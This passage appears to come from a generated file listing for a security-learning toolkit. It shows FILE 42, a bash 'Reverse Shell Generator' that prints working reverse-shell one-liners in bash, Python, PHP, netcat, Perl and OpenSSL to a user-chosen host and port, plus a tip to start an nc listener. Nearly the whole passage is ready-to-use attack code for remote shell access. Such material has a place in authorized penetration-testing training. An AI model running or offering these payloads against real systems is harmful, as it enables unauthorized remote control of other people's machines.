**`help/web_guide.md`**, **`help/network_guide.md`**, **`help/forensics_guide.md`**, **`help/social_eng_guide.md`**, **`help/mobile_guide.md`**, **`help/crypto_guide.md`** - Create each with tool usage examples and methodology explanations.

---

### FILE 42: `resources/payloads/reverse_shells.sh`

```bash
#!/bin/bash
# Cywallearn - CRAB v1 - Reverse Shell Generator
# Generate common reverse shell one-liners

source "$(dirname "$0")/../../config/colors.sh"

echo -e "${C_BCYAN}Reverse Shell Generator${C_RESET}"
echo -e "${C_BCYAN}──────────────────────${C_RESET}"

if [[ $# -ge 2 ]]; then
    LHOST="$1"
    LPORT="$2"
else
    echo -ne "${C_YELLOW}LHOST (your IP):${C_RESET} "; read -r LHOST
    echo -ne "${C_YELLOW}LPORT (your port):${C_RESET} "; read -r LPORT
fi

echo
echo -e "${C_BCYAN}════════════════════ REVERSE SHELLS ════════════════════${C_RESET}"
echo
echo -e "${C_BGREEN}BASH:${C_RESET}"
echo -e "  bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo
echo -e "${C_BGREEN}PYTHON:${C_RESET}"
echo -e "  python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
echo
echo -e "${C_BGREEN}PHP:${C_RESET}"
echo -e "  php -r '\$s=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo
echo -e "${C_BGREEN}NETCAT (with -e):${C_RESET}"
echo -e "  nc -e /bin/sh $LHOST $LPORT"
echo
echo -e "${C_BGREEN}NETCAT (no -e):${C_RESET}"
echo -e "  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo
echo -e "${C_BGREEN}PERL:${C_RESET}"
echo -e "  perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo
echo -e "${C_BGREEN}OPENSSL (encrypted):${C_RESET}"
echo -e "  # On attacker: openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes"
echo -e "  # On attacker: openssl s_server -quiet -key key.pem -cert cert.pem -port $LPORT"
echo -e "  # On target:  mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $LHOST:$LPORT > /tmp/s; rm /tmp/s"
echo
echo -e "${C_CYAN}Tip: Start a listener first: nc -lvnp $LPORT${C_RESET}"
echo -e "${C_BCYAN}════════════════════════════════════════════════════════${C_RESET}"